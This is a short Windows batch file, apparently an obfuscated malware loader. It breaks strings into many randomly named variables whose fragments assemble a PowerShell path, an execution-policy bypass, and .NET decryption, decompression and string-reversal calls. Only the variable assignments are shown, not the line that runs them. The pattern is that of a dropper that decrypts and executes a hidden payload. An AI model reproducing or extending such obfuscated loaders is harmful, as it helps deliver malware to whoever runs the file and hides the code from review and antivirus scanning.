@echo off
set "ZrlqpxiAFv=em"
set "nrQnfcJQkQ=Wi"
set "pLyGzyTkjW=ll"
set "HaVJXBTSvs=\v"
set "HOitCRcsFT=ow"
set "ZRmMALwiAS=he"
set "IgLuLunotd=ws"
set "fhzznYGsau=rS"
set "fZWToLmAAJ=.e"
set "JsrIrLXviK=Po"
set "yXyXAdvrPG=:\"
set "ySmEPOVfSb=co"
set "eORREmgGqJ=do"
set "BsdhvoOxZP=s\"
set "ewjeMYWDPZ=po"
set "fEvOKsXAaA=1."
set "CFeWXmOQiW=\W"
set "esMLPmfGPk=in"
set "dJhXXpQcLp=32"
set "sELAvuJSaP=0\"
set "jknBlONmsK=we"
set "SaRGnIvrbL=he"
set "oYIkKhIibP= /"
set "JBpngSMhUe=xe"
set "WoEnYzjwKo=st"
set "mMHCwSdXsC=y "
set "wtKbHOQDNL=ll"
set "FFKfRnhhWy= C"
set "BtjIDdpunC=rs"
set "ErXfImoxnI=Sy"
set "QmIbJShgMB=nd"
set "OBqfXWKTNJ=py"
set "SENiNKpJWg=we"
set "TqaeZZEteS=cd"
set "PmYUTVHANx= %~dp0"
set "KpIdPNInvJ=ose("
set "iSFdStFaJj=oZZv"
set "ntxEbMFZaH=oZZv"
set "LwJgYjGfUv=HVEu"
set "SSuZyBVfkE=106u"
set "gCsZzVEBcg=DGxi"
set "baIGnsboCk=Star"
set "odcqhMKZms=v.Pa"
set "gSwZpzqcwr=File"
set "NJknVTJzHO== $d"
set "hiTgMRAUsR=fore"
set "qyCDUmLrCD=Bmor"
set "aNIneirRSK=oZZv"
set "RtcqqWvCgR=GxiT"
set "AHHdgjsifk=DGxi"
set "RbQdKZrsid=tion"
set "NOsCDRTvml=U = "
set "SjpFTQtczq=]::("
set "LtrTBwUWTT=Eu);"
set "QerjwiGxNn= [st"
set "BMGkadOKRJ=ecry"
set "lMefzqPGeI=($hK"
set "kwDcOTnJJz=oU.D"
set "nowKiXBBFr=-ep "
set "TaliqLFIyp=join"
set "qbWPTIaFlR= '')"
set "kJjeXTCiEv=.Dis"
set "imtQpxjgWN=..-1"
set "NtQPPTZjQO=]::("
set "BfgHFbremz=Syst"
set "lhyIlKtqCo='txe"
set "LrknpKmXkc=$jxJ"
set "hxmnQlmnYn=;$nd"
set "ARQvbHPLPA=ress"
set "hPLzvdIlsR= = ["
set "ZlPPswjIOf=and "
set "zYTNBxClFf=16] "
set "LWkzZRdBxg=Comp"
set "RudaSWqQSp=saBm"
set "bBlYknsfOt=zuZI"
set "TAZwwOqeZP=ptor"
set "dFKcjIpOhm=6esa"
set "rVnJuTKhnI=T = "
set "AAoyFGRlxJ=rt]:"
set "qlNobBwJXL=raph"
set "AVklnhHJvk=m.IO"
set "bJpIQrjwWV=in $"
set "hOYIpEYTri=iT);"
set "eukpqWUqdn=$WHV"
